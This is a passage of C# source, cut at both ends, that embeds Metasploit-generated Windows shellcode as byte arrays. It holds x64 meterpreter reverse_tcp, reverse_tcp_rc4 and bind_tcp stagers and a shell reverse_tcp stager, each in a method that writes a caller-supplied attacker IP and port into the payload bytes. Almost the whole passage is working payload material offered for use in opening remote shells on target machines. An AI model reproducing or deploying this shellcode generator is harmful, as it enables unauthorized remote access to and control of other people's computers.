                    0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03,
                    0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,
                    0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,
                    0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,
                    0x8d, 0x5d, 0x68, 0x33, 0x32, 0x00, 0x00, 0x68, 0x77, 0x73, 0x32, 0x5f, 0x54, 0x68, 0x4c,
                    0x77, 0x26, 0x07, 0xff, 0xd5, 0xb8, 0x90, 0x01, 0x00, 0x00, 0x29, 0xc4, 0x54, 0x50, 0x68,
                    0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0b, 0x59, 0x50, 0xe2, 0xfd, 0x6a, 0x01, 0x6a,
                    0x02, 0x68, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x97, 0x68, 0x02, 0x00, 0x11, 0x5c, 0x89,
                    0xe6, 0x6a, 0x10, 0x56, 0x57, 0x68, 0xc2, 0xdb, 0x37, 0x67, 0xff, 0xd5, 0x57, 0x68, 0xb7,
                    0xe9, 0x38, 0xff, 0xff, 0xd5, 0x57, 0x68, 0x74, 0xec, 0x3b, 0xe1, 0xff, 0xd5, 0x57, 0x97,
                    0x68, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x6a, 0x00, 0x6a, 0x04, 0x56, 0x57, 0x68, 0x02,
                    0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x8b, 0x36, 0x81, 0xf6, 0xad, 0xb4, 0xa3, 0x6c, 0x8d, 0x8e,
                    0x00, 0x01, 0x00, 0x00, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x51, 0x6a, 0x00, 0x68,
                    0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x8d, 0x98, 0x00, 0x01, 0x00, 0x00, 0x53, 0x56, 0x50,
                    0x6a, 0x00, 0x56, 0x53, 0x57, 0x68, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x01, 0xc3, 0x29,
                    0xc6, 0x75, 0xee, 0x5b, 0x59, 0x5d, 0x55, 0x57, 0x89, 0xdf, 0xe8, 0x10, 0x00, 0x00, 0x00,
                    0x33, 0x64, 0x85, 0x57, 0xde, 0x04, 0x08, 0x04, 0x8f, 0x3a, 0x80, 0xd4, 0xab, 0x99, 0x55,
                    0xf8, 0x5e, 0x31, 0xc0, 0xaa, 0xfe, 0xc0, 0x75, 0xfb, 0x81, 0xef, 0x00, 0x01, 0x00, 0x00,
                    0x31, 0xdb, 0x02, 0x1c, 0x07, 0x89, 0xc2, 0x80, 0xe2, 0x0f, 0x02, 0x1c, 0x16, 0x8a, 0x14,
                    0x07, 0x86, 0x14, 0x1f, 0x88, 0x14, 0x07, 0xfe, 0xc0, 0x75, 0xe8, 0x31, 0xdb, 0xfe, 0xc0,
                    0x02, 0x1c, 0x07, 0x8a, 0x14, 0x07, 0x86, 0x14, 0x1f, 0x88, 0x14, 0x07, 0x02, 0x14, 0x1f,
                    0x8a, 0x14, 0x17, 0x30, 0x55, 0x00, 0x45, 0x49, 0x75, 0xe5, 0x5f, 0xc3
                };
				int num = int.Parse(Port);
				byte b = 0;
				if (num > 256)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[192] = Convert.ToByte(num2);
						array[193] = Convert.ToByte(num4);
					}
					else
					{
						array[192] = b;
						array[193] = Convert.ToByte(num);
					}
				}
				return array;
			}
		}
		public class x64ShellCode
		{
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Ip">Set Shellcode Reverse IP Address (LHOST)</param>
            /// <param name="Port">Set Shellcode Reverse Port Number (LPORT)</param>
            /// <returns></returns>
			public byte[] ReverseTcp(string Ip, string Port)
            {
                /*
                 * windows/x64/meterpreter/reverse_tcp - 449 bytes (stage 1)
                 * http://www.metasploit.com
                 * VERBOSE=false, LHOST=192.168.228.147, LPORT=4444, 
                 * ReverseAllowProxy=false, ReverseListenerThreaded=false, 
                 * StagerRetryCount=10, StagerRetryWait=5, 
                 * PayloadUUIDTracking=false, EnableStageEncoding=false, 
                 * StageEncoderSaveRegisters=, StageEncodingFallback=true, 
                 * PrependMigrate=false, EXITFUNC=process, AutoLoadStdapi=true, 
                 * AutoVerifySession=true, AutoVerifySessionTimeout=30, 
                 * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
                 * EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
                 * SessionRetryWait=10, SessionExpirationTimeout=604800, 
                 * SessionCommunicationTimeout=300, PayloadProcessCommandLine=
                 */
				byte[] array = new byte[]
                {
                    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
                    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
                    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
                    0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
                    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
                    0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b,
                    0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b,
                    0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
                    0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1,
                    0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
                    0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b,
                    0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
                    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48,
                    0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
                    0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00,
                    0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5,
                    0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0xe4, 0x93, 0x41, 0x54, 0x49, 0x89, 0xe4,
                    0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68,
                    0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a,
                    0x41, 0x5e, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89,
                    0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5,
                    0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba,
                    0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0c, 0x49, 0xff, 0xce, 0x75, 0xe5,
                    0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d,
                    0x31, 0xc9, 0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f,
                    0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00,
                    0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4,
                    0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31, 0xc9, 0x49, 0x89,
                    0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5,
                    0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6, 0x75, 0xe1, 0x41, 0xff, 0xe7
                };
				string[] array2 = Ip.Split('.');
				array[246] = Convert.ToByte(array2[0]);
				array[247] = Convert.ToByte(array2[1]);
				array[248] = Convert.ToByte(array2[2]);
				array[249] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				if (num > 256)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[244] = Convert.ToByte(num2);
						array[245] = Convert.ToByte(num4);
					}
					else
					{
						array[244] = b;
						array[245] = Convert.ToByte(num);
					}
				}
				return array;
			}
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Ip">Set Shellcode Reverse IP Address (LHOST)</param>
            /// <param name="Port">Set Shellcode Reverse Port Number (LPORT)</param>
            /// <returns></returns>
			public byte[] ReverseTcpRc4(string Ip, string Port)
            {
                /*
                 * windows/x64/meterpreter/reverse_tcp_rc4 - 585 bytes (stage 
                 * 1)
                 * http://www.metasploit.com
                 * VERBOSE=false, LHOST=192.168.228.147, LPORT=4444, 
                 * ReverseAllowProxy=false, ReverseListenerThreaded=false, 
                 * StagerRetryCount=10, StagerRetryWait=5, 
                 * PayloadUUIDTracking=false, EnableStageEncoding=false, 
                 * StageEncoderSaveRegisters=, StageEncodingFallback=true, 
                 * PrependMigrate=false, EXITFUNC=process, RC4PASSWORD=iSMET, 
                 * AutoLoadStdapi=true, AutoVerifySession=true, 
                 * AutoVerifySessionTimeout=30, InitialAutoRunScript=, 
                 * AutoRunScript=, AutoSystemInfo=true, 
                 * EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
                 * SessionRetryWait=10, SessionExpirationTimeout=604800, 
                 * SessionCommunicationTimeout=300, PayloadProcessCommandLine=
                 */
				byte[] array = new byte[]
                {
                    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
                    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
                    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
                    0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
                    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
                    0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b,
                    0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b,
                    0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
                    0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1,
                    0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
                    0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b,
                    0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
                    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48,
                    0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
                    0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00,
                    0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5,
                    0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0xe4, 0x93, 0x41, 0x54, 0x49, 0x89, 0xe4,
                    0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68,
                    0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a,
                    0x41, 0x5e, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89,
                    0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5,
                    0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba,
                    0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0c, 0x49, 0xff, 0xce, 0x75, 0xe5,
                    0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d,
                    0x31, 0xc9, 0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f,
                    0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x81, 0xf6, 0xad, 0xb4, 0xa3, 0x6c,
                    0x4c, 0x8d, 0x9e, 0x00, 0x01, 0x00, 0x00, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00, 0x10, 0x00,
                    0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5,
                    0xff, 0xd5, 0x48, 0x8d, 0x98, 0x00, 0x01, 0x00, 0x00, 0x49, 0x89, 0xdf, 0x53, 0x56, 0x50,
                    0x4d, 0x31, 0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02,
                    0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6,
                    0x75, 0xe0, 0x49, 0x89, 0xfe, 0x5f, 0x59, 0x41, 0x59, 0x41, 0x56, 0xe8, 0x10, 0x00, 0x00,
                    0x00, 0x33, 0x64, 0x85, 0x57, 0xde, 0x04, 0x08, 0x04, 0x8f, 0x3a, 0x80, 0xd4, 0xab, 0x99,
                    0x55, 0xf8, 0x5e, 0x48, 0x31, 0xc0, 0x49, 0x89, 0xf8, 0xaa, 0xfe, 0xc0, 0x75, 0xfb, 0x48,
                    0x31, 0xdb, 0x41, 0x02, 0x1c, 0x00, 0x48, 0x89, 0xc2, 0x80, 0xe2, 0x0f, 0x02, 0x1c, 0x16,
                    0x41, 0x8a, 0x14, 0x00, 0x41, 0x86, 0x14, 0x18, 0x41, 0x88, 0x14, 0x00, 0xfe, 0xc0, 0x75,
                    0xe3, 0x48, 0x31, 0xdb, 0xfe, 0xc0, 0x41, 0x02, 0x1c, 0x00, 0x41, 0x8a, 0x14, 0x00, 0x41,
                    0x86, 0x14, 0x18, 0x41, 0x88, 0x14, 0x00, 0x41, 0x02, 0x14, 0x18, 0x41, 0x8a, 0x14, 0x10,
                    0x41, 0x30, 0x11, 0x49, 0xff, 0xc1, 0x48, 0xff, 0xc9, 0x75, 0xdb, 0x5f, 0x41, 0xff, 0xe7
                };
				string[] array2 = Ip.Split('.');
				array[246] = Convert.ToByte(array2[0]);
				array[247] = Convert.ToByte(array2[1]);
				array[248] = Convert.ToByte(array2[2]);
				array[249] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				if (num > 256)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[244] = Convert.ToByte(num2);
						array[245] = Convert.ToByte(num4);
					}
					else
					{
						array[244] = b;
						array[245] = Convert.ToByte(num);
					}
				}
				return array;
			}
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Port">Shellcode Listen Port Number (LPORT)</param>
            /// <returns></returns>
			public byte[] BindTcp(string Port)
            {
                /*
                 * windows/x64/meterpreter/bind_tcp - 483 bytes (stage 1)
                 * http://www.metasploit.com
                 * VERBOSE=false, LPORT=4444, RHOST=, 
                 * PayloadUUIDTracking=false, EnableStageEncoding=false, 
                 * StageEncoderSaveRegisters=, StageEncodingFallback=true, 
                 * PrependMigrate=false, EXITFUNC=process, AutoLoadStdapi=true, 
                 * AutoVerifySession=true, AutoVerifySessionTimeout=30, 
                 * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
                 * EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
                 * SessionRetryWait=10, SessionExpirationTimeout=604800, 
                 * SessionCommunicationTimeout=300, PayloadProcessCommandLine=
                 */
				byte[] array = new byte[]
                {
                    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51,
                    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b,
                    0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a,
                    0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1,
                    0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
                    0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00,
                    0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
                    0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
                    0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
                    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
                    0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
                    0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
                    0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
                    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
                    0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33,
                    0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00,
                    0x49, 0x89, 0xe5, 0x48, 0x31, 0xc0, 0x50, 0x50, 0x49, 0xc7, 0xc4, 0x02, 0x00, 0x11, 0x5c,
                    0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff,
                    0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b,
                    0x00, 0xff, 0xd5, 0x6a, 0x02, 0x59, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48,
                    0xff, 0xc0, 0x48, 0x89, 0xc2, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89,
                    0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0xc2, 0xdb,
                    0x37, 0x67, 0xff, 0xd5, 0x48, 0x31, 0xd2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0xb7, 0xe9, 0x38,
                    0xff, 0xff, 0xd5, 0x4d, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x74,
                    0xec, 0x3b, 0xe1, 0xff, 0xd5, 0x48, 0x89, 0xf9, 0x48, 0x89, 0xc7, 0x41, 0xba, 0x75, 0x6e,
                    0x4d, 0x61, 0xff, 0xd5, 0x48, 0x81, 0xc4, 0xb0, 0x02, 0x00, 0x00, 0x48, 0x83, 0xec, 0x10,
                    0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9, 0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba,
                    0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x6a, 0x40,
                    0x41, 0x59, 0x68, 0x00, 0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9,
                    0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d,
                    0x31, 0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9,
                    0xc8, 0x5f, 0xff, 0xd5, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6, 0x75, 0xe1,
                    0x41, 0xff, 0xe7
                };
				int num = int.Parse(Port);
				byte b = 0;
				if (num > 256)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[253] = Convert.ToByte(num2);
						array[254] = Convert.ToByte(num4);
					}
					else
					{
						array[253] = b;
						array[254] = Convert.ToByte(num);
					}
				}
				return array;
			}
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Ip">Set Shellcode Reverse IP Address (LHOST)</param>
            /// <param name="Port">Set Shellcode Reverse Port Number (LPORT)</param>
            /// <returns></returns>
			public byte[] ShellReverseTcp(string Ip, string Port)
            {
                /*
                 * windows/x64/shell/reverse_tcp - 449 bytes (stage 1)
                 * http://www.metasploit.com
                 * VERBOSE=false, LHOST=192.168.228.147, LPORT=4444, 
                 * ReverseAllowProxy=false, ReverseListenerThreaded=false, 
                 * StagerRetryCount=10, StagerRetryWait=5, 
                 * PayloadUUIDTracking=false, EnableStageEncoding=false, 
                 * StageEncoderSaveRegisters=, StageEncodingFallback=true, 
                 * PrependMigrate=false, EXITFUNC=process
                 */
				byte[] array = new byte[]
                {
                    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
                    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
                    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
                    0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
                    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
                    0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b,
                    0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b,
                    0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
                    0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1,
                    0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
                    0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b,
                    0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
                    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48,
                    0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
                    0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00,
                    0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5,
                    0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0xe4, 0x93, 0x41, 0x54, 0x49, 0x89, 0xe4,
                    0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68,
                    0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a,
                    0x41, 0x5e, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89,
                    0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5,
                    0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba,
